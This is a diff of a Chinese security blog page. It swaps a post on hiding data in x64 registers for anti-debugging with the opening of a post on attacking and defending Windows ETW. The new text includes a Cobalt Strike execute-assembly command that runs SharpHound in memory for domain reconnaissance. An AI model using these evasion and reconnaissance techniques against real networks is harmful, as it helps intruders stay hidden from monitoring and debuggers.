@@ -19,81 +19,61 @@
         <meta name="keywords" content="Drunkmars,Drunkmars-theme,Drunkmars-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="我们知道在x64里面，从3环进入0环会调用syscall，那么如果是32位的程序就需要首先转换为x64模式再通过syscall进入0环，这里就会涉及到一系列64位寄存器的操作，我们通过探究其实现原理来达到隐藏数据和反调试的效果。">
+    <meta name="description" content="ETW全称为Event Tracing for Windows，即windows事件跟踪，它是Windows提供的原生的事件跟踪日志系统。由于采用内核层面的缓冲和日志记录机制，所以ETW提供了一种非常高效的事件跟踪日志解决方案，本文基于ETW探究其攻与防的实现">
 <meta property="og:type" content="article">
-<meta property="og:title" content="通过嵌入x64汇编隐藏数据&amp;反调试">
-<meta property="og:url" content="http://drunkmars.top/2022/04/16/%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/index.html">
+<meta property="og:title" content="ETW的攻与防">
+<meta property="og:url" content="http://drunkmars.top/2022/05/12/ETW/index.html">
 <meta property="og:site_name" content="Drunkmars">
-<meta property="og:description" content="我们知道在x64里面，从3环进入0环会调用syscall，那么如果是32位的程序就需要首先转换为x64模式再通过syscall进入0环，这里就会涉及到一系列64位寄存器的操作，我们通过探究其实现原理来达到隐藏数据和反调试的效果。">
+<meta property="og:description" content="ETW全称为Event Tracing for Windows，即windows事件跟踪，它是Windows提供的原生的事件跟踪日志系统。由于采用内核层面的缓冲和日志记录机制，所以ETW提供了一种非常高效的事件跟踪日志解决方案，本文基于ETW探究其攻与防的实现">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/835440_PKEJUDAQP2525N9.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416101850996.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416105056401.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416105355272.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416105500616.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416110013065.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416160409447.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416160435716.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416160541121.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416160920069.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416161829495.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416162011320.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416163145576.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416162238259.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416184622252.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416184631559.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417104717665.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417105113060.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417110242775.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417110321933.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417110522063.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417110539028.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417111122574.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417111238787.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417111332918.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417111524864.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417111353567.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417111820996.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417171143684.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417171157693.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417171216564.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417171250573.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417191548783.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417171447568.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417171533505.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417172649913.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417172719482.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417172831624.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417172854758.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417172918414.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417173003616.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417185839002.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417185148937.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417190120093.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417190135929.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417190152890.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417190521283.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417190551281.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417193910062.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417204508726.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417204736641.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417204821422.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417205853777.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417205905916.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417210113692.png">
-<meta property="og:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417210229225.png">
-<meta property="article:published_time" content="2022-04-15T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-04-20T07:30:48.371Z">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512105644794.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512124646901.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512110110750.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512110147258.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512110528763.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220513124718747.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220513124807622.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512153622148.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512154845367.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512154925602.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512155157965.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512182344215.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512195501155.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512211127018.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512211108513.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512214614676.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220513125227900.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512212858818.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512215550869.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512215639441.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512220715962.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512215704961.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512213010406.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512213027871.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512213036239.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512213114820.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512222805809.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512223054442.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512223238120.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512223402930.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220513122021737.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512223941657.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512223957730.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512224033566.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220512224950161.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220513104316834.png">
+<meta property="og:image" content="http://drunkmars.top/images/ETW/image-20220513123017709.png">
+<meta property="article:published_time" content="2022-05-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-05-13T08:06:49.019Z">
 <meta property="article:author" content="Drunkmars">
 <meta property="article:tag" content="二进制">
-<meta property="article:tag" content="内核">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://drunkmars.top/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/835440_PKEJUDAQP2525N9.png">
+<meta name="twitter:image" content="http://drunkmars.top/images/ETW/image-20220512105644794.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/Drunkmars.ico">
     
-    <title>通过嵌入x64汇编隐藏数据&amp;反调试 · Drunkmars&#39;s Blog</title>
+    <title>ETW的攻与防 · Drunkmars&#39;s Blog</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -318,7 +298,7 @@
                 <a href="/">Drunkmars&#39;s Blog</a>
             </div>
             <div class="post-title header-element">
-                <a href="#" class="post-name">通过嵌入x64汇编隐藏数据&反调试</a>
+                <a href="#" class="post-name">ETW的攻与防</a>
             </div>
         </div>
     
@@ -364,7 +344,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-                通过嵌入x64汇编隐藏数据&反调试
+                ETW的攻与防
             <!-- 404 -->
             
         </h1>
@@ -386,20 +366,18 @@
     
         <a class="post-tag" href="javascript:void(0);" data-tags="二进制">二进制</a>
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="内核">内核</a>
-    
 </div>
 
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">2.6k</span>阅读时长: <span class="post-count reading-time">10 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">3.1k</span>阅读时长: <span class="post-count reading-time">13 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
                     <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2022/04/16</span>
+                    <span class="post-intro-time">2022/05/12</span>
                     <!-- busuanzi -->
                     
                         <span id="busuanzi_container_page_pv" class="busuanzi-pv">
@@ -554,207 +532,188 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <p>我们知道在x64里面，从3环进入0环会调用<code>syscall</code>，那么如果是32位的程序就需要首先转换为x64模式再通过<code>syscall</code>进入0环，这里就会涉及到一系列64位寄存器的操作，我们通过探究其实现原理来达到隐藏数据和反调试的效果。</p>
+        <p><code>ETW</code>全称为<code>Event Tracing for Windows</code>，即windows事件跟踪，它是Windows提供的原生的事件跟踪日志系统。由于采用内核层面的缓冲和日志记录机制，所以<code>ETW</code>提供了一种非常高效的事件跟踪日志解决方案，本文基于<code>ETW</code>探究其攻与防的实现</p>
 <span id="more"></span>
 
+<h1 id="ETW"><a href="#ETW" class="headerlink" title="ETW"></a>ETW</h1><p>事件监测（<code>Event Instrumentation</code>）总会包含两个基本的实体，事件的提供者（<code>ETW Provider</code>）和消费者（<code>ETW Consumer</code>），<code>ETW</code>框架可以视为它们的中介。<code>ETW Provider</code>会预先注册到ETW框架上，提供者程序在某个时刻触发事件，并将标准化定义的事件提供给<code>ETW</code>框架。<code>Consumer</code>同样需要注册到<code>ETW</code>框架上，在注册的时候可以设置事件的删选条件和接收处理事件的回调。对于接收到的事件，如果它满足某个注册<code>ETW Consumer</code>的筛选条件，<code>ETW</code>会调用相应的回调来处理该事件</p>
+<p><code>ETW</code>针对事件的处理是在某个会话（<code>ETW Session</code>）中进行的，<code>ETW Session</code>提供了一个接收、存储、处理和分发事件的执行上下文。<code>ETW</code>框架可以创建多一个会话来处理由提供者程序发送的事件，但是<code>ETW Session</code>并不会与某个单一的提供者绑定在一起，多个提供者程序可以向同一个<code>ETW Session</code>发送事件。对于接收到的事件，<code>ETW Session</code>可以将它保存在创建的日志文件中，也可以实时地分发给注册的消费者应用。<code>ETW</code>会话的开启和终止是通过 <code>Session</code>的开启和终止是通过ETW控制器（<code>ETW Controller</code>）进行管理的。除了管理<code>ETW Session</code>之外，<code>ETW Controller</code>还可以禁用或者恢复注册到某个<code>ETW Session</code>上的<code>ETW Provider</code></p>
+<p>在这里，我们可以看到所有已注册的<code>ETW</code>提供者及其对应<code>GUID</code>，我们还可以看到<code>Microsoft-Windows-Threat-Intelligence</code>突出显示的提供者及其<code>InstrumentationManifest</code>位于<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Publishers\&lt;PROVIDER_GUID&gt;</code>注册表项的二进制清单文件因为这是一个<code>Manifest-based ETW</code>提供者</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logman.exe query providers</span><br></pre></td></tr></table></figure>
 
 
-<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>在支持IA-32e模式的系统上，提供扩展功能启用寄存器(<code>IA32_EFER</code>)，该寄存器控制IA-32e模式的激活和其他IA-32e模式的操作。下图是该寄存器的布局：</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/835440_PKEJUDAQP2525N9.png" alt="avatar"></p>
-<table>
-<thead>
-<tr>
-<th align="center"><strong>比特</strong></th>
-<th align="center"><strong>名称</strong></th>
-<th align="center"><strong>描述</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">0</td>
-<td align="center">SYSCALL Enable:IA32_EFER.SCE(R/W)</td>
-<td align="center">在64位模式下启动SYSCALL/SYSRET指令</td>
-</tr>
-<tr>
-<td align="center">8</td>
-<td align="center">IA-32e Mode Enable:IA32_EFER.LME(R/W)</td>
-<td align="center">启用IA-32e模式</td>
-</tr>
-<tr>
-<td align="center">10</td>
-<td align="center">IA-32e Mode Active: IA32_EFER.LMA(R)</td>
-<td align="center">标识设置时IA-32e模式处于活动状态</td>
-</tr>
-<tr>
-<td align="center">11</td>
-<td align="center">Execute Disable Bit Enable: IA32_EFER.NXE(R/W)</td>
-<td align="center">该位为1时，表示可以使用Execution disable功能，给某些页定义为不可执行的页面</td>
-</tr>
-</tbody></table>
-<p>EFER是MSR中的一员，它的地址是<code>0xC0000080</code>，它是x64体系的基石。当<code>EFER.LME=1</code>时，表示要开起<code>IA-32e</code>模式。可是，此时并不代表已经进入了<code>IA-32e</code>模式，因为开启<code>IA-32e</code>模式后必须要开启分页内存管理机制，也就是说，当<code>EFER.LME=1</code>且<code>CR0.PG=1</code>时，处理器会将<code>EFER.LMA</code>置为1，当其成功置为1以后，才表示<code>IA-32e</code>模式处于激活状态。</p>
+
+<p><img src="/images/ETW/image-20220512105644794.png" alt="image-20220512105644794"></p>
+<p>我们可以使用以下命令获取更多详细信息并了解提供程序支持的事件类型</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logman.exe query providers Microsoft-Windows-Threat-Intelligence</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/ETW/image-20220512124646901.png" alt="image-20220512124646901"></p>
+<p><img src="/images/ETW/image-20220512110110750.png" alt="image-20220512110110750"></p>
+<p>也可以<code>XML Manifest</code>使用此工具检索文件，这使我们可以更详细地了解特定<code>EtwTi</code>事件记录的参数</p>
+<p><img src="/images/ETW/image-20220512110147258.png" alt="image-20220512110147258"></p>
+<p>使用<code>x nt!EtwTi*</code>来查看内核里面的所有例程</p>
+<p><img src="/images/ETW/image-20220512110528763.png" alt="image-20220512110528763"></p>
+<h1 id="execute-assembly"><a href="#execute-assembly" class="headerlink" title="execute-assembly"></a>execute-assembly</h1><p>cs在3.11版本实现了在非托管程序中加载<code>.net</code>程序集的功能，这个功能不需要向硬盘写入文件，十分隐蔽，而且现有的<code>Powershell</code>脚本能够很容易的转换为<code>C#</code>代码，十分方便，使用到的就是<code>execute-assembly</code>这个命令，这里我们用c#程序<code>sharphound.exe</code>进行演示，这个程序用来导出域内关系并可视化</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute-assembly D:\Bloodhound\SharpHound.exe -c all</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/ETW/image-20220513124718747.png" alt="image-20220513124718747"></p>
+<p><img src="/images/ETW/image-20220513124807622.png" alt="image-20220513124807622"></p>
+<p>首先我们来了解一下托管程序和非托管程序，说到这里就需要提一个<code>CLR</code>。<code>CLR</code>全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。<code>CLR</code>是<code>.NET Framework</code>的主要执行引擎，作用之一是监视程序的运行：</p>
+<ul>
+<li>在CLR监视之下运行的程序属于托管的代码</li>
+<li>不在CLR之下，直接在裸机上运行的应用或者组件属于非托管的代码</li>
+</ul>
+<p>托管程序与非托管程序的概念如下</p>
 <blockquote>
-<p>处理器在上电开始运行时或复位后是处于实地址模式，CR0控制寄存器的PE标志用来控制处理器处于实地址模式还是保护模式。标志寄存器(EFLAGS)的VM标志用来控制处理器是在虚拟8086模式还是普通保护模式下，EFER寄存器的LME用来启用IA-32e模式</p>
+<p>托管代码就是Visual Basic .NET和C#编译器编译出来的代码。编译器把代码编译成中间语言(IL)，而不是能直接在你的电脑上运行的机器码。中间语言被封装在一个叫程序集 (assembly)的文件中，程序集中包含了描述你所创建的类，方法和属性(例如安全需求)的所有元数据。</p>
+<p>非托管代码就是在Visual Studio .NET 2002发布之前所创建的代码。例如Visual Basic 6, Visual C++ 6, 最糟糕的是，连那些依然残存在你的硬盘中、拥有超过15年历史的陈旧C编译器所产生的代码都是非托管代码。托管代码直接编译成目标计算机的机械码，这些代 码只能运行在编译出它们的计算机上，或者是其它相同处理器或者几乎一样处理器的计算机上。</p>
 </blockquote>
-<p>当第8位为1则处于<code>IA-32e</code>模式</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416101850996.png" alt="image-20220416101850996"></p>
-<p>看一个<code>00209b00 00000000</code>，拆分可得<code>0010 0000 1001 1011</code>，即L位为1，处于<code>IA-32e</code>模式下，P=1证明段选择子有效，DPL=0为0环权限，Type大于8为代码段</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416105056401.png" alt="image-20220416105056401"></p>
-<p>也可以直接使用<code>dg 10</code>，即与GDT表的相对偏移</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416105355272.png" alt="image-20220416105355272"></p>
-<p>再看<code>00409300 0000000</code>，拆分可得<code>0100 0000 1001 0011</code>，Type小于8为数据段，在数据段<code>L位</code>被废弃，P=1证明段选择子有效，DPL=0为0环权限</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416105500616.png" alt="image-20220416105500616"></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416110013065.png" alt="image-20220416110013065"></p>
-<p>然后再看一个特殊的TSS段，这里的TSS段的Base并不是<code>74c93000</code></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416160409447.png" alt="image-20220416160409447"></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416160435716.png" alt="image-20220416160435716"></p>
-<p>而是通过后面的进行拼接得到<code>fffff806 74008bc9</code></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416160541121.png" alt="image-20220416160541121"></p>
-<p>在x86里面TSS段保存了一堆寄存器的值，但是在x64里TSS段不用来任务切换，主要保存一堆rsp备用指针中断门描述符扩展到128位</p>
-<p>注意第一个4字节是保留的</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416160920069.png" alt="image-20220416160920069"></p>
-<p>中断门标识符同样拓展到了128位，取<code>fffff806</code>和<code>72425100</code>进行拼接</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416161829495.png" alt="image-20220416161829495"></p>
-<p>然后看一下x64的IDT</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416162011320.png" alt="image-20220416162011320"></p>
-<p>注意这里1、2、8好的IST是由特殊分配的</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416163145576.png" alt="image-20220416163145576"></p>
-<p>如下所示</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416162238259.png" alt="image-20220416162238259"></p>
-<p>几个特殊的地址如下所示</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416184622252.png" alt="image-20220416184622252"></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220416184631559.png" alt="image-20220416184631559"></p>
-<h1 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h1><p>只使用一张SSDT 表，x64用户程序通过 <code>syscall</code>进入内核，x86用户程序在<code>ring3</code>转入x64模式再进入内核</p>
-<p>首先看x64的<code>NtOpenProcess</code></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417104717665.png" alt="image-20220417104717665"></p>
-<p> 调用了<code>syscall</code></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417105113060.png" alt="image-20220417105113060"></p>
-<p>再打开一个32位的<code>notepad</code></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417110242775.png" alt="image-20220417110242775"></p>
-<p>首先调用<code>ntdll</code>的<code>77878870</code></p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417110321933.png" alt="image-20220417110321933"></p>
-<p>跳转到全局变量</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417110522063.png" alt="image-20220417110522063"></p>
-<p>这里到了<code>777E7000</code>这个地方，在正常x86的情况下，cs是0023，而33则是为x64，也就是说x86的程序在x64上执行会首先将cs从0023转换为0033，即从x86-&gt;x64，但是这里在3环的调试器是不能实现这个转换过程的，而且单步执行到<code>777E7000</code>这个地方如果想要再往下执行是会失败的</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417110539028.png" alt="image-20220417110539028"></p>
-<p>我们去windbg里面看断点看一下情况，这里是通过r15寄存器来进行操作</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417111122574.png" alt="image-20220417111122574"></p>
-<p>然后我们在<code>777e7009</code>这个地方下断点</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417111238787.png" alt="image-20220417111238787"></p>
-<p><code>g</code>继续执行即可断在<code>jmp</code>语句的位置</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417111332918.png" alt="image-20220417111332918"></p>
-<p>这里可以看一下<code>r15</code>寄存器可以发现，编译器在开始之前就已经初始化了<code>r15</code>寄存器这块的内存</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417111524864.png" alt="image-20220417111524864"></p>
-<p>然后继续F11往下跟，发现又使用了<code>r14</code>寄存器</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417111353567.png" alt="image-20220417111353567"></p>
-<p>这里就不单步走了，直接找到<code>syscall</code>的位置，这里可以发现编译器一共使用了<code>r8</code>、<code>r11</code>、<code>r13</code>、<code>r14</code>、<code>r15</code>五个寄存器</p>
-<p><img src="/images/x64asm%E9%9A%90%E8%97%8F%E5%86%85%E5%AD%98/image-20220417111820996.png" alt="image-20220417111820996"></p>
-<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>首先我们说一下数据隐藏的思路，我们知道在64位系统上运行x86程序需要首先通过<code>jmp far</code>指令将x86程序转换为x64，那么我们就可以通过自己构造硬编码的方式将想要隐藏的内存放到没有使用的64位寄存器上(如r12)，需要使用的时候再通过<code>jmp far</code>指令转换为x64后再去读取寄存器的值即可实现数据隐藏</p>
-<p>然后在x86程序里面嵌入x64汇编这种方式也可以有效的进行反调试，一般对我们程序的调试都是通过3环调试器，当3环调试器跟到x86转换到x64的汇编语句时，继续单步执行是会一直循环的，如果想要调试程序就需要使用0环调试器才能够进行调试，有效的进行了反调试</p>
